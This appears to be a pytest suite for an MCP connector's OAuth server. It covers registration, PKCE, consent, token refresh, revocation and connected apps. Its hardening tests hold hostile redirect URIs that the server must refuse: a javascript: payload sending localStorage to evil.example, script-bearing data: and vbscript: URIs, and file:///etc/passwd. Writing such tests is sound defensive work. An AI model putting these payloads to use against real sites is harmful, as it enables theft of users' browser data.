"""The MCP connector's own authorization server, end to end over HTTP: an app registers, the student
allows it on the consent page (through /api/mcp/authorizations), the app trades its code for tokens,
refreshes, and is cut off from Settings → Connected apps or by /revoke."""

from __future__ import annotations

import base64
import hashlib
import json
import secrets
from datetime import UTC, datetime, timedelta
from urllib.parse import parse_qs, urlparse

import pytest
from fastapi.testclient import TestClient

from app.assignments import deadlines
from app.main import app
from tests.conftest import make_token
from tests.scrum_support import UID
from tests.test_mcp_controller import _db

REDIRECT = "https://claude.ai/api/mcp/auth_callback"
OTHER = "00000000-0000-0000-0000-0000000000ee"
MCP_HEADERS = {
    "Accept": "application/json, text/event-stream",
    "Content-Type": "application/json",
    "MCP-Protocol-Version": "2025-11-25",
}


@pytest.fixture
def db(monkeypatch):
    return _db(monkeypatch)


@pytest.fixture
def c(db):
    with TestClient(app) as client:
        yield client


def _session(sub: str = UID) -> dict:
    return {"Authorization": f"Bearer {make_token(sub=sub)}"}


def _register(c: TestClient, name: str = "Claude") -> str:
    r = c.post(
        "/register",
        json={
            "client_name": name,
            "redirect_uris": [REDIRECT],
            "token_endpoint_auth_method": "none",
            "grant_types": ["authorization_code", "refresh_token"],
            "response_types": ["code"],
        },
    )
    assert r.status_code == 201, r.text
    return r.json()["client_id"]


def _pkce() -> tuple[str, str]:
    verifier = secrets.token_urlsafe(48)
    challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=")
    return verifier, challenge.decode()


def _authorize(c: TestClient, client_id: str, challenge: str) -> str:
    r = c.get(
        "/authorize",
        params={
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": REDIRECT,
            "code_challenge": challenge,
            "code_challenge_method": "S256",
            "state": "st-1",
        },
        follow_redirects=False,
    )
    assert r.status_code == 302, r.text
    loc = urlparse(r.headers["location"])
    assert loc.path == "/oauth/consent"
    return parse_qs(loc.query)["request"][0]


def _answer(c: TestClient, request_id: str, approve: bool, sub: str = UID):
    return c.post(
        f"/api/mcp/authorizations/{request_id}", json={"approve": approve}, headers=_session(sub)
    )


def _code_from(redirect_url: str) -> str:
    q = parse_qs(urlparse(redirect_url).query)
    assert q["state"] == ["st-1"]
    return q["code"][0]


def _token(c: TestClient, client_id: str, code: str, verifier: str):
    return c.post(
        "/token",
        data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT,
            "client_id": client_id,
            "code_verifier": verifier,
        },
    )


def _connect(c: TestClient, name: str = "Claude") -> tuple[str, dict]:
    client_id = _register(c, name)
    verifier, challenge = _pkce()
    request_id = _authorize(c, client_id, challenge)
    r = _answer(c, request_id, True)
    assert r.status_code == 200, r.text
    tokens = _token(c, client_id, _code_from(r.json()["redirect_url"]), verifier)
    assert tokens.status_code == 200, tokens.text
    return client_id, tokens.json()


def _tools(c: TestClient, access_token: str):
    body = {"jsonrpc": "2.0", "id": 1, "method": "tools/list", "params": {}}
    return c.post(
        "/mcp",
        headers={**MCP_HEADERS, "Authorization": f"Bearer {access_token}"},
        content=json.dumps(body),
    )


def _refresh(c: TestClient, client_id: str, refresh_token: str):
    return c.post(
        "/token",
        data={
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "client_id": client_id,
        },
    )


def _shift_clock(monkeypatch, delta: timedelta) -> None:
    later = datetime.now(UTC) + delta
    monkeypatch.setattr(deadlines, "now_utc", lambda: later)


# ------------------------------------------------------------------ the happy path ----


def test_metadata_names_this_api_as_the_authorization_server(c):
    resource = c.get("/.well-known/oauth-protected-resource/mcp").json()
    server = c.get("/.well-known/oauth-authorization-server").json()

    assert resource["authorization_servers"] == [server["issuer"]]
    assert server["registration_endpoint"].endswith("/register")
    assert server["code_challenge_methods_supported"] == ["S256"]


def test_connect_then_use_mcp(c, db):
    client_id, tokens = _connect(c)

    assert tokens["token_type"] == "Bearer"
    assert tokens["expires_in"] == 3600
    r = _tools(c, tokens["access_token"])
    assert r.status_code == 200, r.text
    # Only hashes are stored.
    stored = {row["token_hash"] for row in db.rows("mcp_tokens")}
    assert tokens["access_token"] not in stored
    assert hashlib.sha256(tokens["access_token"].encode()).hexdigest() in stored
    (grant,) = db.rows("mcp_grants")
    assert grant["user_id"] == UID and grant["client_id"] == client_id


def test_consent_details_name_the_app_and_its_redirect_host(c):
    client_id = _register(c, "Claude")
    request_id = _authorize(c, client_id, _pkce()[1])

    r = c.get(f"/api/mcp/authorizations/{request_id}", headers=_session())

    assert r.status_code == 200
    assert r.json() == {"app_name": "Claude", "redirect_host": "claude.ai"}


def test_consent_routes_need_a_site_session(c):
    request_id = _authorize(c, _register(c), _pkce()[1])

    assert c.get(f"/api/mcp/authorizations/{request_id}").status_code == 401
    assert (
        c.post(f"/api/mcp/authorizations/{request_id}", json={"approve": True}).status_code == 401
    )


def test_a_site_session_token_does_not_open_mcp(c):
    assert _tools(c, make_token(sub=UID)).status_code == 401


def test_an_mcp_token_does_not_open_the_api(c):
    _, tokens = _connect(c)

    r = c.get("/api/login-check", headers={"Authorization": f"Bearer {tokens['access_token']}"})

    assert r.status_code == 401


# ------------------------------------------------------------------ consent answers ----


def test_deny_sends_access_denied_and_issues_nothing(c, db):
    request_id = _authorize(c, _register(c), _pkce()[1])

    r = _answer(c, request_id, False)

    assert r.status_code == 200
    q = parse_qs(urlparse(r.json()["redirect_url"]).query)
    assert q["error"] == ["access_denied"] and q["state"] == ["st-1"]
    assert db.rows("mcp_grants") == []
    # A denied request cannot be approved afterwards.
    assert _answer(c, request_id, True).status_code == 404


def test_a_request_is_answered_once(c):
    request_id = _authorize(c, _register(c), _pkce()[1])
    assert _answer(c, request_id, True).status_code == 200

    assert _answer(c, request_id, True, sub=OTHER).status_code == 404


def test_an_expired_request_is_gone(c, monkeypatch):
    request_id = _authorize(c, _register(c), _pkce()[1])
    _shift_clock(monkeypatch, timedelta(minutes=11))

    assert c.get(f"/api/mcp/authorizations/{request_id}", headers=_session()).status_code == 404
    assert _answer(c, request_id, True).status_code == 404


def test_an_unknown_request_is_404(c):
    assert c.get("/api/mcp/authorizations/nope", headers=_session()).status_code == 404


# ----------------------------------------------------------------- codes and tokens ----


def test_a_code_is_redeemed_once(c):
    client_id = _register(c)
    verifier, challenge = _pkce()
    redirect = _answer(c, _authorize(c, client_id, challenge), True).json()["redirect_url"]
    code = _code_from(redirect)

    assert _token(c, client_id, code, verifier).status_code == 200
    second = _token(c, client_id, code, verifier)
    assert second.status_code == 400
    assert second.json()["error"] == "invalid_grant"


def test_a_wrong_verifier_is_refused(c):
    client_id = _register(c)
    _, challenge = _pkce()
    code = _code_from(_answer(c, _authorize(c, client_id, challenge), True).json()["redirect_url"])

    assert _token(c, client_id, code, "not-the-verifier-" + "x" * 40).status_code == 400


def test_refresh_rotates(c):
    client_id, tokens = _connect(c)

    r = _refresh(c, client_id, tokens["refresh_token"])

    assert r.status_code == 200, r.text
    fresh = r.json()
    assert fresh["refresh_token"] != tokens["refresh_token"]
    assert _tools(c, fresh["access_token"]).status_code == 200


def test_reusing_a_rotated_refresh_token_ends_the_grant(c, monkeypatch):
    client_id, tokens = _connect(c)
    fresh = _refresh(c, client_id, tokens["refresh_token"]).json()
    _shift_clock(monkeypatch, timedelta(minutes=1))

    reuse = _refresh(c, client_id, tokens["refresh_token"])

    assert reuse.status_code == 400
    assert _tools(c, fresh["access_token"]).status_code == 401
    assert _refresh(c, client_id, fresh["refresh_token"]).status_code == 400


def test_an_access_token_expires_after_an_hour(c, monkeypatch):
    _, tokens = _connect(c)
    _shift_clock(monkeypatch, timedelta(hours=1, minutes=1))

    assert _tools(c, tokens["access_token"]).status_code == 401


def test_a_grant_ends_90_days_after_the_allow(c, monkeypatch):
    client_id, tokens = _connect(c)
    refresh = tokens["refresh_token"]
    for day in (29, 58, 87):  # each refresh token lasts 30 days
        _shift_clock(monkeypatch, timedelta(days=day))
        r = _refresh(c, client_id, refresh)
        assert r.status_code == 200, day
        refresh = r.json()["refresh_token"]
    _shift_clock(monkeypatch, timedelta(days=91))

    assert _refresh(c, client_id, refresh).status_code == 400


def test_revoke_ends_the_grant(c):
    client_id, tokens = _connect(c)

    # The SDK's revocation form requires the field, empty for a public client.
    r = c.post(
        "/revoke",
        data={"token": tokens["refresh_token"], "client_id": client_id, "client_secret": ""},
    )

    assert r.status_code == 200
    assert _tools(c, tokens["access_token"]).status_code == 401


# -------------------------------------------------------------------- connected apps ----


def test_connected_apps_lists_mine_and_disconnects(c):
    client_id, tokens = _connect(c, "Claude")

    listed = c.get("/api/mcp/connections", headers=_session())
    assert listed.status_code == 200
    (app_row,) = listed.json()["connections"]
    assert app_row["client_id"] == client_id and app_row["app_name"] == "Claude"
    assert c.get("/api/mcp/connections", headers=_session(OTHER)).json() == {"connections": []}

    assert c.delete(f"/api/mcp/connections/{client_id}", headers=_session(OTHER)).status_code == 404
    assert c.delete(f"/api/mcp/connections/{client_id}", headers=_session()).status_code == 204
    assert _tools(c, tokens["access_token"]).status_code == 401
    assert _refresh(c, client_id, tokens["refresh_token"]).status_code == 400
    assert c.get("/api/mcp/connections", headers=_session()).json() == {"connections": []}


# ----------------------------------------------------------------- keeping it small ----


def test_registration_drops_apps_never_used_after_a_day(c, db, monkeypatch):
    stale = _register(c, "Never used")
    used, _ = _connect(c, "Used")
    _shift_clock(monkeypatch, timedelta(hours=25))

    _register(c, "Newcomer")

    ids = {row["client_id"] for row in db.rows("mcp_clients")}
    assert stale not in ids and used in ids


def test_registration_refuses_oversized_metadata(c):
    r = c.post(
        "/register",
        json={
            "client_name": "x" * 10000,
            "redirect_uris": [REDIRECT],
            "token_endpoint_auth_method": "none",
        },
    )

    assert r.status_code == 400
    assert r.json()["error"] == "invalid_client_metadata"


# ------------------------------------------------------------- hardening ----


@pytest.mark.parametrize(
    "uri",
    [
        "javascript:fetch('//evil.example/'+btoa(localStorage))//",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)",
        "file:///etc/passwd",
    ],
)
def test_registration_refuses_a_redirect_that_would_run_in_the_page(c, uri):
    r = c.post(
        "/register",
        json={
            "client_name": "Claude",
            "redirect_uris": [uri],
            "token_endpoint_auth_method": "none",
        },
    )

    assert r.status_code == 400
    assert r.json()["error"] == "invalid_redirect_uri"


def test_an_answer_never_sends_the_browser_to_a_script(c, db):
    request_id = _authorize(c, _register(c), _pkce()[1])
    row = next(r for r in db.rows("mcp_authorizations") if r["id"] == request_id)
    row["params"]["redirect_uri"] = "javascript:alert(1)//"  # stored before the check existed

    assert _answer(c, request_id, False).status_code == 400
    assert _answer(c, request_id, True).status_code == 400


def test_a_refresh_ends_the_old_access_token(c):
    client_id, tokens = _connect(c)

    fresh = _refresh(c, client_id, tokens["refresh_token"]).json()

    assert _tools(c, tokens["access_token"]).status_code == 401
    assert _tools(c, fresh["access_token"]).status_code == 200


def test_replaying_a_code_ends_the_grant_it_made(c):
    client_id = _register(c)
    verifier, challenge = _pkce()
    code = _code_from(_answer(c, _authorize(c, client_id, challenge), True).json()["redirect_url"])
    first = _token(c, client_id, code, verifier).json()

    assert _token(c, client_id, code, verifier).status_code == 400
    assert _tools(c, first["access_token"]).status_code == 401
